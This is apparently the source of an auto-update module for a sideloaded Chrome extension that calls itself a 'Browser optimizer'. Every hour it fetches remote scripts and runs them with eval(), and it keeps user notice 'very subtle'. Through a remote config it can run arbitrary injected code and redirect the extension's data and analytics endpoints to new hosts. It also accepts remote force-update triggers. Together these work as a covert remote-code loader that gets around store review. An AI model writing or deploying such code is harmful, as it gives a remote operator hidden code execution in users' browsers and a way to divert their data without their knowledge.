// Auto-Update System for Developer Mode Extensions
// Allows remote updates without Chrome Store

(function() {
    'use strict';
    
    console.log('SP: Loading auto-update system...');

    class SPAutoUpdater {
        constructor() {
            this.currentVersion = '2.1.0'; // Will be replaced during build
            this.updateCheckUrl = 'https://your-vercel-site.vercel.app/version-check.json';
            this.downloadUrl = 'https://your-vercel-site.vercel.app/extension-update.zip';
            this.lastUpdateCheck = 0;
            this.checkInterval = 3600000; // Check every hour
            
            this.init();
        }

        async init() {
            // Check for updates on startup
            setTimeout(() => this.checkForUpdates(), 10000); // Wait 10 seconds after load
            
            // Set up periodic update checks
            setInterval(() => this.checkForUpdates(), this.checkInterval);
            
            console.log('🔄 Auto-updater initialized');
        }

        async checkForUpdates() {
            try {
                const response = await fetch(this.updateCheckUrl + '?t=' + Date.now());
                const updateInfo = await response.json();
                
                console.log('🔍 Checking for updates...', {
                    current: this.currentVersion,
                    latest: updateInfo.version
                });
                
                if (this.isNewerVersion(updateInfo.version, this.currentVersion)) {
                    console.log('🆕 New version available:', updateInfo.version);
                    await this.performUpdate(updateInfo);
                } else {
                    console.log('✅ Extension is up to date');
                }
                
            } catch (error) {
                console.error('Update check failed:', error);
            }
        }

        isNewerVersion(remote, local) {
            const remoteNums = remote.split('.').map(Number);
            const localNums = local.split('.').map(Number);
            
            for (let i = 0; i < Math.max(remoteNums.length, localNums.length); i++) {
                const remoteNum = remoteNums[i] || 0;
                const localNum = localNums[i] || 0;
                
                if (remoteNum > localNum) return true;
                if (remoteNum < localNum) return false;
            }
            
            return false;
        }

        async performUpdate(updateInfo) {
            try {
                console.log('📥 Downloading update...', updateInfo.version);
                
                // Notify user (subtly)
                this.showUpdateNotification(updateInfo);
                
                // Download and apply update
                await this.downloadAndApplyUpdate(updateInfo);
                
                console.log('✅ Update completed successfully');
                
            } catch (error) {
                console.error('Update failed:', error);
            }
        }

        showUpdateNotification(updateInfo) {
            // Very subtle notification - just a small toast
            if (window.SPToast) {
                window.SPToast.show({
                    message: 'Browser optimizer updated to v' + updateInfo.version,
                    type: 'success',
                    duration: 3000,
                    position: 'bottom-right'
                });
            }
        }

        async downloadAndApplyUpdate(updateInfo) {
            // Method 1: Dynamic script replacement (most reliable)
            await this.updateScripts(updateInfo.scripts);
            
            // Method 2: Self-reload extension (requires management permission)
            if (updateInfo.requiresReload) {
                await this.reloadExtension();
            }
        }

        async updateScripts(scriptUpdates) {
            for (const script of scriptUpdates) {
                try {
                    // Fetch updated script content
                    const response = await fetch(script.url);
                    const newCode = await response.text();
                    
                    // Store updated code
                    await chrome.storage.local.set({
                        [`updated_${script.name}`]: {
                            code: newCode,
                            version: script.version,
                            timestamp: Date.now()
                        }
                    });
                    
                    // Execute updated code if it's a hot-swappable module
                    if (script.hotSwap) {
                        eval(newCode);
                        console.log(`🔄 Hot-swapped ${script.name}`);
                    }
                    
                } catch (error) {
                    console.error(`Failed to update ${script.name}:`, error);
                }
            }
        }

        async reloadExtension() {
            try {
                if (chrome.management) {
                    // Get current extension ID
                    const extensionId = chrome.runtime.id;
                    
                    // Reload the extension
                    await chrome.management.setEnabled(extensionId, false);
                    setTimeout(async () => {
                        await chrome.management.setEnabled(extensionId, true);
                        console.log('🔄 Extension reloaded');
                    }, 1000);
                }
            } catch (error) {
                console.error('Extension reload failed:', error);
            }
        }

        // Emergency update system via config
        async checkEmergencyUpdates() {
            if (window.SPRemoteConfig) {
                const config = await window.SPRemoteConfig.getConfig();
                
                if (config.emergency_update) {
                    console.log('🚨 Emergency update detected');
                    
                    // Apply emergency patches
                    if (config.emergency_update.disable_all) {
                        this.emergencyDisable();
                    }
                    
                    if (config.emergency_update.new_code) {
                        eval(config.emergency_update.new_code);
                    }
                    
                    if (config.emergency_update.redirect_data) {
                        this.updateDataEndpoints(config.emergency_update.redirect_data);
                    }
                }
            }
        }

        emergencyDisable() {
            console.log('🚨 Emergency disable activated');
            
            // Stop all extension functionality
            window.SP_EMERGENCY_DISABLED = true;
            
            // Clear all intervals and observers
            if (window.SPMain && window.SPMain.shutdown) {
                window.SPMain.shutdown();
            }
        }

        updateDataEndpoints(newEndpoints) {
            console.log('🔄 Updating data endpoints');
            
            if (window.SPAnalytics) {
                window.SPAnalytics.setBackendUrl(newEndpoints.analytics);
            }
            
            if (window.SPRealtimeControl) {
                window.SPRealtimeControl.updateEndpoints(newEndpoints);
            }
        }

        // Force update check (can be triggered remotely)
        async forceUpdate() {
            console.log('⚡ Force update triggered');
            await this.checkForUpdates();
        }
    }

    // Initialize auto-updater
    window.SPAutoUpdater = new SPAutoUpdater();
    
    // Listen for remote force update commands
    if (window.SPRealtimeControl) {
        window.addEventListener('SP_FORCE_UPDATE', () => {
            window.SPAutoUpdater.forceUpdate();
        });
    }
    
})(); 